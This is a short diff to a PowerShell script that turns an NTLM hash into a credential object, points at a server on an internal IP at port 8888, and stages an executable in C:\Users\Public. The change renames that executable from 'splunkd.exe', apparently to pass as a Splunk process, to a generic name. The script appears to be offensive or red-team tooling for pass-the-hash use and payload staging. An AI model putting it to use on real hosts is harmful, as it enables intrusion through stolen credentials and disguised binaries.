@@ -6,7 +6,8 @@ $SecureNTLMHash = ConvertTo-SecureString -String $NTLMHash -AsPlainText -Force
 $Credential = New-Object System.Management.Automation.PSCredential("$DomainName\$UserName", $SecureNTLMHash)
 
 $server = "http://172.16.172.16:8888"
-$file = "C:\Users\Public\splunkd.exe"
+$fileName = "new_file.exe"
+$file = "C:\Users\Public\$fileName"
 
 if (Test-Path $file) {
     $runningProcess = Get-Process | Where-Object { $_.Modules.FileName -eq $file }
@@ -39,6 +40,3 @@ try {
     Write-Host "Error occurred during process start:"
     Write-Host $_.Exception.Message
 }
-
-
-
